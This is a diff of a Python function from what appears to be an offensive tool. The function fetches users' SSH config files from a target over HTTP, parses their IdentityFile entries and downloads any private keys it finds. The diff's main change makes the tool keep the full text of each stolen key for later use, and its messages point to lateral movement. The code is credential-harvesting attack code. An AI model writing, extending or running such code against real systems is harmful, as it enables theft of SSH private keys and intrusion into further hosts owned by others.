@@ -158,7 +158,7 @@ def check_ssh_config(user, home, prefix, proxy, verbose=False, all_users=None):
         try:
             response = session.get(config_url, timeout=10)
             if response.status_code == 200 and response.text.strip():
-                print(f"{ORANGE}[!]{RESET} SSH config found for {user}: {config_url} - lateral movement might be possible")
+                print(f"{ORANGE}[!]{RESET} SSH config found for {user}: {config_url} - possible lateral movement")
                 config_text = response.text
                 current_host = None
                 host_details = {}
@@ -205,6 +205,7 @@ def check_ssh_config(user, home, prefix, proxy, verbose=False, all_users=None):
                             idf_response = session.get(candidate_url, timeout=10)
                             if idf_response.status_code == 200 and "PRIVATE KEY-----" in idf_response.text:
                                 print(f"{RED}[!]{RESET} Private key found for {user} at: {candidate_url}")
+                                found_identity_keys.append((user, candidate_url, idf_response.text))
                         except requests.RequestException as e:
                             if verbose:
                                 print(f"{RED}[-]{RESET} Error fetching IdentityFile for {user} at {candidate_url}: {e}")
@@ -228,6 +229,7 @@ def check_ssh_config(user, home, prefix, proxy, verbose=False, all_users=None):
                             idf_response = session.get(candidate_url, timeout=10)
                             if idf_response.status_code == 200 and "PRIVATE KEY-----" in idf_response.text:
                                 found_identity_keys.append((user, candidate_url, idf_response.text))
+                           
                         except requests.RequestException as e:
                             if verbose:
                                 print(f"{RED}[-]{RESET} Error fetching IdentityFile for {user} at {candidate_url}: {e}")
